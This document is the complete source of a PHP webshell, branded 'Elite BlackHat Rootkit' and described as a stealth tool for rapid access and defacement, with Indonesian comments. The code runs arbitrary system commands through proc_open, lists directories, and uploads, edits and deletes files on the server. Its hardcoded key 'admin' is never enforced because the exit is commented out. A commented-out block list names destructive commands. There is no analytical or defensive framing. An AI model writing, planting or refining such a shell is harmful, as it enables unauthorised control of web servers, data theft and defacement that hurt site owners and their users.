<?php
/**
 * Simple Stealth Webshell
 * Author: Custom Build for APT ELITE BLACKHAT
 * Version: 1.0.0
 * Description: Minimalist, low-footprint webshell for rapid access and defacement support.
 */

// --- CONFIGURATION ---
// Ganti 'secret' dengan password/custom key untuk akses
$SECRET_KEY = "admin"; 
$MAX_EXEC_TIME = 30; // Detik timeout eksekusi command

// --- SECURITY & STEALTH ---
// Cek apakah ada parameter secret di query string atau POST
$is_admin = false;
if (isset($_GET['key']) && $_GET['key'] === $SECRET_KEY) {
    $is_admin = true;
} elseif (isset($_POST['key']) && $_POST['key'] === $SECRET_KEY) {
    $is_admin = true;
}

// Jika bukan admin, sembunyikan semua output kecuali error fatal
if (!$is_admin && php_sapi_name() !== 'cli') {
    // Opsional: Redirect atau exit silent
    // exit; 
}

// --- HELPER FUNCTIONS ---

function clean_output($output) {
    // Membersihkan newline berlebih dan karakter aneh
    return preg_replace('/\s+/', ' ', trim($output));
}

function execute_command($cmd) {
    if (empty($cmd)) return "No command specified.";
    
    // Batasi beberapa command berbahaya jika ingin lebih ketat
    // $blocked = ['rm -rf /', 'mkfs'];
    // foreach ($blocked as $b) { if (stripos($cmd, $b) !== false) return "Blocked: $b"; }

    $output = "";
    $return_var = 0;
    
    // Gunakan proc_open untuk kontrol lebih baik daripada system/exec
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin
       1 => array("pipe", "w"),  // stdout
       2 => array("pipe", "w")   // stderr
    );

    $process = proc_open($cmd, $descriptorspec, $pipes);
    
    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $return_var = proc_close($process);
        
        // Gabungkan error ke output jika ada
        if (!empty($error)) {
            $output .= "\n[STDERR]: " . $error;
        }
    } else {
        $output = "Failed to spawn process.";
    }
    
    return $output;
}

function get_file_info($path) {
    if (!file_exists($path)) return null;
    return [
        'name' => basename($path),
        'size' => filesize($path),
        'perms' => substr(sprintf('%o', fileperms($path)), -4),
        'owner' => posix_getpwuid(fileowner($path))['name'] ?? 'unknown',
        'group' => posix_getgrgid(filegroup($path))['name'] ?? 'unknown',
        'modified' => date('Y-m-d H:i:s', filemtime($path))
    ];
}

function upload_file($target_dir, $file_key) {
    if (!isset($_FILES[$file_key]) || $_FILES[$file_key]['error'] !== UPLOAD_ERR_OK) {
        return "Upload failed or no file selected.";
    }
    
    $tmp_name = $_FILES[$file_key]['tmp_name'];
    $name = basename($_FILES[$file_key]['name']);
    $dest = $target_dir . '/' . $name;
    
    // Pindahkan file
    if (move_uploaded_file($tmp_name, $dest)) {
        return "Success: Uploaded '$name' to $dest";
    } else {
        return "Error: Could not move uploaded file.";
    }
}

// --- LOGIC HANDLER ---

$action = $_POST['action'] ?? $_GET['action'] ?? '';
$command = $_POST['cmd'] ?? '';
$file_path = $_POST['file_path'] ?? '.';
$upload_key = $_POST['upload_key'] ?? 'file';

$response_msg = "";

// Handle Upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES[$upload_key])) {
    $response_msg = upload_file($file_path, $upload_key);
}

// Handle Command Execution
if ($action === 'exec' && !empty($command)) {
    set_time_limit($MAX_EXEC_TIME);
    $exec_result = execute_command($command);
}

// --- UI RENDERING ---

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shell Access</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background-color: #0d0d0d; color: #00ff00; margin: 0; padding: 20px; }
        a { color: #00ff00; text-decoration: none; border-bottom: 1px dotted #00ff00; }
        a:hover { background-color: #003300; }
        .container { max-width: 900px; margin: 0 auto; }
        .header { border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .status-bar { background: #1a1a1a; padding: 10px; border: 1px solid #333; margin-bottom: 20px; font-size: 0.9em; }
        .panel { background: #111; border: 1px solid #333; padding: 15px; margin-bottom: 20px; }
        h1, h2, h3 { color: #fff; margin-top: 0; }
        input[type="text"], textarea { width: 98%; background: #000; color: #0f0; border: 1px solid #333; padding: 8px; font-family: inherit; }
        button { background: #004400; color: #fff; border: 1px solid #00ff00; padding: 8px 15px; cursor: pointer; font-weight: bold; }
        button:hover { background: #006600; }
        pre { background: #000; border: 1px solid #333; padding: 10px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; min-height: 100px; color: #ccc; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #aaa; }
        .msg-success { color: #00ff00; }
        .msg-error { color: #ff3333; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #333; }
        th { color: #aaa; }
        .hidden { display: none; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1><span style="color:#fff;">[</span> Elite Shell <span style="color:#fff;">]</span></h1>
        <div>
            <?php echo "User: " . get_current_user(); ?><br>
            <?php echo "Server: " . $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?>
        </div>
    </div>

    <!-- Status Bar -->
    <div class="status-bar">
        Current Dir: <strong><?php echo getcwd(); ?></strong> | 
        PHP Version: <?php echo phpversion(); ?> | 
        Time: <?php echo date('Y-m-d H:i:s'); ?>
    </div>

    <?php if ($response_msg): ?>
        <div class="panel msg-<?php echo strpos($response_msg, 'Success') !== false ? 'success' : 'error'; ?>">
            <?php echo htmlspecialchars($response_msg); ?>
        </div>
    <?php endif; ?>

    <!-- Navigation -->
    <div style="margin-bottom: 20px;">
        <a href="?key=<?php echo $SECRET_KEY; ?>&action=exec">CMD</a> | 
        <a href="?key=<?php echo $SECRET_KEY; ?>&action=files">Files</a> | 
        <a href="?key=<?php echo $SECRET_KEY; ?>&action=phpinfo">PHP Info</a> | 
        <a href="?key=<?php echo $SECRET_KEY; ?>&action=clear">Clear</a>
    </div>

    <?php if ($action === 'phpinfo'): ?>
        <div class="panel">
            <h3>PHP Information</h3>
            <?php phpinfo(); ?>
        </div>
    <?php elseif ($action === 'files'): ?>
        <div class="panel">
            <h3>File Manager</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="hidden" name="key" value="<?php echo $SECRET_KEY; ?>">
                <div class="form-group">
                    <label>Current Directory: <input type="text" name="file_path" value="<?php echo $file_path; ?>"></label>
                    <button type="submit" name="action" value="list">Refresh List</button>
                </div>
                
                <?php 
                if (isset($_POST['action']) && $_POST['action'] === 'list') {
                    $dir = $_POST['file_path'];
                    if (is_dir($dir)) {
                        $items = scandir($dir);
                        echo "<table><tr><th>Name</th><th>Type</th><th>Size</th><th>Perms</th><th>Action</th></tr>";
                        foreach ($items as $item) {
                            if ($item === '.' || $item === '..') continue;
                            $full_path = $dir . '/' . $item;
                            $type = is_dir($full_path) ? 'DIR' : 'FILE';
                            $info = get_file_info($full_path);
                            $icon = $type === 'DIR' ? '📁' : '📄';
                            
                            echo "<tr>";
                            echo "<td>{$icon} {$item}</td>";
                            echo "<td>{$type}</td>";
                            echo "<td>" . ($type === 'FILE' ? round($info['size']/1024, 2) . ' KB' : '-') . "</td>";
                            echo "<td>{$info['perms']}</td>";
                            echo "<td>";
                            if ($type === 'FILE') {
                                echo "<a href='?key={$SECRET_KEY}&action=edit&file={$full_path}'>Edit</a> | ";
                                echo "<a href='?key={$SECRET_KEY}&action=delete&file={$full_path}' onclick='return confirm(\"Delete {$item}?\");'>Del</a>";
                            } else {
                                echo "<a href='?key={$SECRET_KEY}&action=files&file_path={$full_path}'>Enter</a>";
                            }
                            echo "</td>";
                            echo "</tr>";
                        }
                        echo "</table>";
                    } else {
                        echo "<p>Directory does not exist.</p>";
                    }
                }
                ?>

                <hr>
                <h4>Upload File</h4>
                <div class="form-group">
                    <label>Select File:</label>
                    <input type="file" name="<?php echo $upload_key; ?>">
                    <button type="submit">Upload</button>
                </div>
            </form>
            
            <?php 
            // Handle Delete Action
            if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['file'])) {
                $del_path = $_GET['file'];
                if (unlink($del_path)) {
                    echo "<div class='msg-success'>Deleted: {$del_path}</div>";
                } else {
                    echo "<div class='msg-error'>Failed to delete: {$del_path}</div>";
                }
            }
            
            // Handle Edit Action
            if (isset($_GET['action']) && $_GET['action'] === 'edit' && isset($_GET['file'])) {
                $edit_path = $_GET['file'];
                if (is_writable($edit_path)) {
                    $content = file_get_contents($edit_path);
                    echo "<form method='post'>";
                    echo "<input type='hidden' name='key' value='{$SECRET_KEY}'>";
                    echo "<input type='hidden' name='file_path' value='{$edit_path}'>";
                    echo "<label>Editing: {$edit_path}</label>";
                    echo "<textarea name='content' rows='10'>" . htmlspecialchars($content) . "</textarea><br>";
                    echo "<button type='submit' name='save_file'>Save Changes</button>";
                    echo "</form>";
                    
                    if (isset($_POST['save_file'])) {
                        if (file_put_contents($edit_path, $_POST['content']) !== false) {
                            echo "<div class='msg-success'>File saved successfully.</div>";
                        } else {
                            echo "<div class='msg-error'>Failed to save file.</div>";
                        }
                    }
                } else {
                    echo "<div class='msg-error'>File is not writable: {$edit_path}</div>";
                }
            }
            ?>
        </div>
    <?php else: // Default CMD View ?>
        <div class="panel">
            <h3>Command Execution</h3>
            <form method="post">
                <input type="hidden" name="key" value="<?php echo $SECRET_KEY; ?>">
                <div class="form-group">
                    <label>Command:</label>
                    <input type="text" name="cmd" value="<?php echo htmlspecialchars($command); ?>" autofocus>
                    <button type="submit" name="action" value="exec">Execute</button>
                </div>
            </form>
            
            <?php if (!empty($command)): ?>
                <h4>Output:</h4>
                <pre><?php echo nl2br(htmlspecialchars($exec_result ?? '')); ?></pre>
            <?php endif; ?>
        </div>
    <?php endif; ?>

    <div style="margin-top: 50px; text-align: center; font-size: 0.8em; color: #555;">
        Elite BlackHat Rootkit v1.0 | No Trace
    </div>
</div>
</body>
</html>
